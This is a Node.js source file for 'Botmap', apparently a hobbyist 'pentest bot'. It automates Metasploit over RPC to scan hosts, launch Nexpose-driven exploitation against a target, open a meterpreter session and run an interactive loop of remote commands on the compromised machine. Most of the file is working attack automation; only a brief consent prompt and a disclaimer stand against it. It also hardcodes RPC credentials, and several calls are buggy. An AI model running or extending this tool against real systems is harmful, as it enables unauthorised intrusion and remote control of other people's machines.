#! /usr/bin/env node
import mc from 'msfnode'
import Task from 'shell-task'
import {execSync} from 'child_process'
import c from 'colors/safe'
import prompt from 'prompt-sync'

let client = new mc({
  login: 'bot',
  password: 'botpass',
})

const version =  'BETA 0.3.0'

//set theme
c.setTheme({
 silly: 'rainbow',
 input: 'grey',
 verbose: 'cyan',
 prompt: 'grey',
 info: 'green',
 data: 'grey',
 help: 'cyan',
 warn: 'yellow',
 debug: 'blue',
 error: 'red'
})

//make sure that the user know what he's doing
function userAuth() {
 console.warn(c.warn("Note,that you need the permission of the target's owner !"))
 console.warn(c.warn('Are you sure you want to scan and attack: \n' + target))
 console.log(c.prompt('Press "y" to continue | "n" to stop!'))
let input = prompt.prompt()

if (input != 'y') {
  console.log(c.info('Maybe a wise decision..'))
  process.exit(0)
  }
}

client.on('connected', onConnect)

//do this on connect
function onConnect (err, token) {
  if(err) {
    console.error(c.error('Could not connect \n' + err))
    process.exit(1)
  } else {
    userInteraction()
    console.log(c.info('connected'))
  }

}
//create console fx
function startConsole() {
  console.log(c.info('Opening a console... '))
  let id = ''
  const args =['console.create']
  id = client.exec(args, (err, r) => {
    if(err) {
      console.error(c.error('Could not open a new console \n' + err))
    } else {
      console.log(c.info('Console opened, cleaning it... \n'))

      client.exec(['console.read'], (err, r) => {
        if(err) {
          console.error(c.error('Could not open a new Console...' + err))
          process.exit
        }
        console.log(c.info('Done !'))
        console.log(c.info('Returning to usermenu...'))

      })
    }
  })
  return id
}

/* --- SERVER FUNCTIONS
function startServer() {
  console.log(c.info('Starting server ! '))
  execSync('msfrpcd -U bot -P botpass -f ', (err, stdout, stderr) => {
    if(err || stderr) {
    const error = err || stderr
    console.error(c.error('Could not start server \n' + error ))
   } else {
     console.log(c.info('started server'))
   }
  })
}

function stopServer() {
  client.exec('core.stop', (err, r) => {
    if(err) {
      console.error(c.error('Could not stop server ! \n ' + err))
    } else {
      console.log(c.info('server halted'))
    }
  })
}
*/
/* ---- END SERVER FUNCTIONS | SETUP FUNCTIONS ---- */
//add workspace fx
function workspace(console_id) {
  console.log(c.info('Adding workspace...'))
  const args = ['console.write',console_id,'workspace -a botmap\n'] //format console.write,id,[command,arguments +\n]
  client.exec(args, (err, r) => {
    if(err) {
      console.error(c.error('Could not add workspace \n' + err))
      process.exit(1)
    } else {
      console.log(c.info('workspace added'))
    }
  } )
}

//switch workspace fx
function switchWorkspace(console_id) {
  console.log(c.info('Switching workspace...'))
  client.exec(['console.write',console_id,'workspace botmap\n'], (err, r) => {
    if(err) {
      console.error(c.error('Could not switch workspace \ n' + err))
    } else {
      console.log(c.info('workspace switched'))
    }
  })
}

/* ---- END SETUP FUNCTIONS | EXPLOIT FUNCTIONS ---- */

function macScan(target) {
  execSync('arp-scan -l -I', (err, stdout, stderr) => {
    if(err || stderr) {
      const error = err || stderr
      console.error(c.error('An error occured \n' + error ))
    } else {
      console.log(stdout)
    }
  })
}

function portScan(target, console_id) {
  let args = ['console.write', console_id,'db_nmap -sS -n' + target +'\n']
  client.exec(args, (err, r) => {
    if(err) {
      console.error(c.error('Could not scan target [' + target + ']' + err))
      process.exit(1)
    } else {
      console.log(c.info('performed scan'))
      let args = ['console.read', console_id]
      client.exec(args, (err, res) => {
        if(err) {
          console.error(c.error('Could not read data ! \n' + err))
          process.exit(1)
        } else {
          console.log(res)
        }
      })
    }
  })
}


function generalScan(target, console_id) {
  let args = ['console.write', console_id,'db_nmap -sS -sV -sU -n -O' + target +'\n']
  client.exec(args, (err, r) => {
    if(err) {
      console.error(c.error('Could not scan target [' + target + ']' + err))
      process.exit(1)
    } else {
      console.log(c.info('performed scan'))
      let args = ['console.read', console_id]
      client.exec(args, (err, res) => {
        if(err) {
          console.error(c.error('Could not read data ! \n' + err))
          process.exit(1)
        } else {
          console.log(res)
        }
      })
    }
  })
}

function exploit(target, console_id) {
  console.log(c.info('starting scan... \n loading nexpose module'))
  //load nexpose
  console.log(c.info('loading nexpose...'))
  let args = ['console.write', console_id, 'load nexpose \n']
  client.exec(args, (err, res) => {
    if(err) {
      console.error(c.error('Could not load nexpose module ! \n ' + err))
      process.exit(1)
    } else {
      console.log(c.info('Done ! '))
    }
  })
  //start full nexpose audit
  console.log(c.info('logging in to nexpose...'))
  args = ['console.write', console_id, 'nexpose_connect bot:botpass@127.0.0.1 \n']
  client.exec(args, (err, res) => {
    if(err) {
      console.error(c.err('Could not log in to local nexpose service !' + err))
      process.exit(1)
    } else {
      console.log(c.info('Done !'))
    }
  })
  //start scan
  console.log(c.info('Starting actual scan now... '))
  args = ['console.write', console_id, 'nexpose_scan -x \n' + target]
  client.exec(args, (err, res) => {
    if(err) {
      console.error(c.error('Could not scan' + target + '\n' + err))
      process.exit(1)
    } else {
      console.log(c.info('Done ! '))
    }
  })
  //meterpreter if possible
  console.log(c.info('Trying to connect using meterpreter...'))
  args = ['console.write', console_id, 'sessions -i 1 \n']
  client.exec(args, (err, res) => {
    if(err) {
      console.error(c.error('Could not connect to target [' + target + '] \n' +err))
      process.exit(1)
    } else {
      console.log(c.info('Looks like botmap was able to connect ! \n' +res))
    }
  })
  args = ['console.read', console_id]
  client.exec(args, (err, res) => {
    if(err) {
      console.error(c.error('An error occured \n' + err ))
    } else {
      console.log(res)
    }
  })
  console.log(c.info('Now entering prompt-execute loop \n You should have full access to the target machine ! \n Type botmap-exit to exit the loop !'))
  while (true) {
    let remoteCommand = prompt.prompt()
    if(remoteCommand == 'botmap-exit') {
      console.log(c.info('Starting disconnection process...'))
      client.exec('core.stop', (err, res) => {
        if (err) {
          console.err(c.error('Could not stop \n' + err))
        } else {
          console.log(c.info('Everything has been shutdown ! Have a nice day =]'))
        }
      })
      return false
    }
    args = ['console.write', console_id, remoteCommand + '\n']
    client.exec(args, (err, res) => {
      if (err) {
        console.error(c.error('An error occured: \n ' + err))
      }
    })
    args = ['console.read', console_id]
    client.exec(args, (err, res) => {
      if(err) {
        console.error(c.error('An error occured \n' + err ))
      } else {
        console.log(res)
      }
    })
  }
}

/* ---- END EXPLOIT FUNCTIONS | USER MENU ---- */
function userInteraction() {
  const userArgs = process.argv.slice(2)

  let client = new mc({
    login: 'bot',
    password: 'botpass',
  })
  if (userArgs[0] == 'target' || userArgs[0] == '-t') {
    let id = startConsole()
    startConsole()
    switchWorkspace(id)
    exploit(userArgs[1], id)

  } else if (userArgs[0] == 'about' || userArgs[0] == '-a') {
    console.log(c.info('-----------------------------------------------------------------'))
    console.log(c.info('Botmap, a pentest bot ! '))
    console.log(c.info('Author: Coretool'))
    console.log(c.info('License: MIT '))
    console.log(c.info('Note that I am not responsible for what you do with botmap'))
    console.log(c.info('Visit github.com/coretool/botmap for more !'))
    console.log(c.info('-----------------------------------------------------------------'))

  } else if (userArgs[0] == 'help' || userArgs[0] == '-h') {
    console.log('Help screen goes here') //to do add help

  } else if(userArgs[0] == 'setup' || userArgs[0] == '-s') {
    console.log(c.info('Seeting up botmap ! \n Note that you only have to use this once per release'))
    let id = startConsole()
    execSync('clear') //just to get rid of the ugly text
    workspace(id)
    console.log(c.info('Done ! '))

  } else if (userArgs[0] == 'scan' && userArgs[1] == 'mac' ) {
    console.log(c.info('Mac address scan...'))
    macScan(userArgs[2])
    console.log(c.info('Done !'))

  } else if (userArgs[0] == 'scan' && userArgs[1] == 'port') {
    console.log(c.info('Port scan...'))
    let id = startConsole()
    startConsole()
    switchWorkspace(id)
    portScan(userArgs[2], id)
    console.log(c.info('Done ! '))

  } else if (userArgs[0] == 'scan' && userArgs[1] == 'general') {
    console.log(c.info('General scan...'))
    let id = startConsole()
    startConsole()
    switchWorkspace(id)
    generalScan(userArgs[2], id)
  } else {
    console.log(c.help('Botmap version: ' + version + ' use "botmap -h" for the help menu'))
  }
}
